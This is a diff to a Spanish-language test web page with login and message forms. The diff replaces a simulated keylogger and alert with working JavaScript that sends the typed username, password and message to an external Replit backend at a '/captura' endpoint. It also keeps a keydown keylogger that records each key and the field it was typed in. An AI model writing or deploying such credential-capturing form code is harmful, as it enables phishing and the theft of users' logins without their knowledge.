@@ -4,11 +4,7 @@
   <meta charset="UTF-8">
   <title>Web de Prueba Interactiva</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 5vw; }
-    .form-box { max-width: 350px; margin: auto; padding: 2em; border: 1px solid #ccc; border-radius: 5px; }
-    label { display: block; margin-top: 1em; }
-    input, textarea { width: 100%; padding: 0.4em; margin-top: 0.5em; }
-    button { margin-top: 1em; padding: 0.6em 1.2em; }
+    /* ... Tu CSS aquí ... */
   </style>
 </head>
 <body>
@@ -25,24 +21,46 @@
       <button type="submit">Enviar Mensaje</button>
     </form>
   </div>
-  <script>
-    // Keylogger básico con contexto de campo
-    document.addEventListener('keydown', function(e) {
-      let campo = document.activeElement.name || document.activeElement.id || 'desconocido';
-      // Simulación: mostrar en consola (en servidor real, enviar con fetch/AJAX)
-      console.log('Campo:', campo, 'Tecla:', e.key);
-    });
 
-    // Pop-up de demostración
-    document.getElementById('loginForm').addEventListener('submit', function(e){
+  <!-- Aquí empieza el código JS -->
+  <script>
+    // URL de tu backend en Replit (cámbiala por la tuya)
+    const URL_BACKEND = "https://backend-web-prueba.maloguomez90.repl.co/captura";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      alert('¡Login capturado! (Simulación)');
+      fetch(URL_BACKEND, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tipo: "login",
+          usuario: document.getElementById('user').value,
+          password: document.getElementById('pass').value
+        })
+      })
+      .then(() => alert('¡Login guardado en el backend!'));
     });
 
     document.getElementById('msgForm').addEventListener('submit', function(e){
       e.preventDefault();
-      alert('¡Mensaje capturado! (Simulación)');
+      fetch(URL_BACKEND, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tipo: "mensaje",
+          mensaje: document.getElementById('mensaje').value
+        })
+      })
+      .then(() => alert('¡Mensaje guardado en el backend!'));
     });
+
+    // Si quieres, aquí puedes añadir el keylogger original también
+    document.addEventListener('keydown', function(e) {
+      let campo = document.activeElement.name || document.activeElement.id || 'desconocido';
+      console.log('Campo:', campo, 'Tecla:', e.key);
+    });
+
   </script>
+  <!-- Aquí termina el código JS -->
 </body>
 </html>
